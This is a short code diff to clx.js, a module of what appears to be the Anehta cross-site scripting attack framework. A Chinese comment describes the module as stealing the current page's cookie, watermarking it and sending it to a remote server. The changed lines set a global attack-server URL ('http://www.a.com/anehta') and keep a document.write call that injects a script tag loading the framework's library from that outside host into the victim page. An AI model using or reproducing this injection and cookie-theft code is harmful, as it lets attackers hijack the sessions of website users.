@@ -1,3 +1,5 @@
+var anehtaurl = "http://www.a.com/anehta";
+//var anehtaurl = "http://www.a.com/anehta";
 /////////////////////////////////////////////////
 // clx.js 楚留香模块，盗取当前页面cookie, 标记水印
 // 并发送到远程server
@@ -13,7 +15,6 @@
 // 检查BaseLib是否加载
 if (typeof anehta == "undefined"){
 	//alert("Base Lib is not Loaded!");
-	var anehtaurl = "http://www.a.com/anehta";
   var AnehtaLib = anehtaurl+"/library/anehta.js";
 	document.write("<script src="+AnehtaLib+"></script>");
 }
